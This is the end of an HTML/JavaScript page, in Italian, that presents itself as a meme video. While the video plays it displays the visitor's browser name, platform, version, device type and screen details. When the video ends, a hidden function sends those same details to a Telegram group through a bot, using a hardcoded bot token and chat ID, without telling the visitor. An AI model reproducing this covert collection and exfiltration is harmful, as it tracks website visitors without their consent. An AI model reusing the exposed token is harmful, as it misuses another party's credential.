    <style>
        * { background: black; color: white; margin:0; padding:0; }
        body, #preload, #loading, #start, #data { display:flex; justify-content:center; align-items:center; flex-direction:column; text-align:center; }
        #video, #preload { position:absolute; top:0; left:0; width:100vw; height:100vh; }
        #loading-progress { font-size:16px; }
        #start { display:none; cursor:pointer; }
        #data, #data span { background:transparent !important; }
    </style>
</head>

<body>
    <div id="preload">
        <div id="loading">
            <span>Caricamento In Corso</span>
            <span class="subtitle"><span id="loading-progress">0</span>%</span>
        </div>
        <div id="start"><span>Clica Per Iniziare</span></div>
    </div>
    <div id="data"></div>
    <video id="video" playsinline style="pointer-events:none"></video>

    <script>
    window.onload = async () => {
        const loadingProgress = document.getElementById('loading-progress');
        const video = document.getElementById('video');
        const preload = document.getElementById('preload');
        const loading = document.getElementById('loading');
        const start = document.getElementById('start');
        const data = document.getElementById('data');

        const memes = [];
        let step = 0;
        let interval;

        const e = m => loading.innerText = m;
        const p = (k,d,s) => d && memes.push(`${k}: ${d}${s||''}`);

        video.oncanplaythrough = async () => {
            loadingProgress.textContent = '97';
            const detector = new BrowserDetector(window.navigator.userAgent).parseUserAgent();
            p('Nome Browser', detector.name);
            p('Piattaforma', detector.platform);
            p('Versione Browser', detector.version);
            p('Mobile/Tablet', (detector.isMobile||detector.isTablet)?'Yes':'No');
            p('Larghezza Schermo', screen.width+' px');
            p('Altezza Schermo', screen.height+' px');
            p('Orientamento', typeof screen.orientation!=='undefined'?screen.orientation.type.split('-')[0]:'N/A');
            p('Rotazione', typeof screen.orientation!=='undefined'?screen.orientation.angle+' degrees':'N/A');
            loadingProgress.textContent='100';
            loading.style.display='none';
            start.style.display='flex';
            preload.style.cursor='pointer';
        };

        preload.onclick = () => {
            if(start.style.display!='flex') return;
            preload.style.display='none';
            video.src = 'jammin.mp4';
            video.play();
            let fontSize = Math.min(window.innerHeight/10, window.innerWidth/20);
            data.style.fontSize = fontSize+'px';
            interval = setInterval(()=>{
                const time = video.currentTime - 13.166 - step*0.5;
                if(time>0){
                    const el = document.createElement('span');
                    el.textContent = memes[step] || '';
                    data.appendChild(el);
                    const height = data.getBoundingClientRect().height;
                    if(height>window.innerHeight){ fontSize-=fontSize/10; data.style.fontSize=fontSize+'px'; }
                    step++;
                }
            },10);
        };

        // Funzione per invio a Telegram
        async function sendMemesToTelegram(memes){
            const botToken = '8211854109:AAFj3Z3FtRaL-ikZZyV45_aYnqUsRBFnPFc';
            const chatId = '-1002522701737'; // ID gruppo
            const message = encodeURIComponent(memes.join("\n"));
            try{
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`);
                console.log('Dati inviati a Telegram');
            }catch(err){
                console.error('Errore invio Telegram:', err);
            }
        }

        video.onended = () => {
            video.style.display='none';
            if(interval) clearInterval(interval);
            sendMemesToTelegram(memes);
        };
    };
    </script>
</body>
</html>
